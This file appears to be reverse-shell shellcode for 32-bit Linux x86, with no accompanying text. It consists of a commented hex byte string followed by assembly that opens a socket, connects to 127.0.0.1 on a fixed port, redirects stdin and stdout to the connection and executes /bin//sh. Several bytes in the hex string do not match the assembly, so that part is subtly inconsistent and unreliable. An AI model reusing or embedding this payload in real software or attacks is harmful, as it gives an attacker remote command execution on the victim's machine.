;Bytecode __start
  ;\x31\xc0\x31\xdb\x31\xd2\x50\xb0\x66\x43\x52
  ;\x6a\x01\x6a\x02\x80\xe1\xcd\x80\x66\xbe\x02
  ;\x00\x89\xc7\xb0\x66\xb3\x03\x68\x7f\x00\x00
  ;\x01\x66\x68\x27\x10\x66\x56\x89\xe2\x6a\x10
  ;\x52\x57\x89\xe1\xcd\x89\x31\xc9\x89\xfb\xb0
  ;\x3f\xb1\x00\xcd\x80\xb0\x3f\xb1\x01\xcd\x80
  ;\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62
  ;\x69\x6e\xb0\x0b\x89\xe3\x51\x89\xe2\x53\x89
  ;\xe1\xcd\x80
;Bytecode __end



BITS 32
xor  eax,eax
xor  ebx,ebx
xor  edx,edx
push eax

mov  al,102 
inc  ebx                              ;socket
push edx 
push BYTE 0x1
push BYTE 0x2
mov  ecx,esp
int  0x80

mov  si,0x2
mov  edi,eax

mov  al,102                           ;connect
mov  bl,3 
push DWORD 0x0100007f      ;127.0.0.1
push WORD  0x1027
push WORD  si
mov  edx,esp
push BYTE 16
push edx
push edi
mov  ecx,esp
int  0x80

xor  ecx,ecx

mov  ebx,edi
mov  al,63
mov  cl,0
int  0x80

mov  al,63
mov  cl,1
int  0x80

xor  ecx,ecx
push ecx
push 0x68732f2f
push 0x6e69622f

mov  al,11
mov  ebx,esp
push ecx
mov  edx,esp
push ebx
mov  ecx,esp
int  0x80
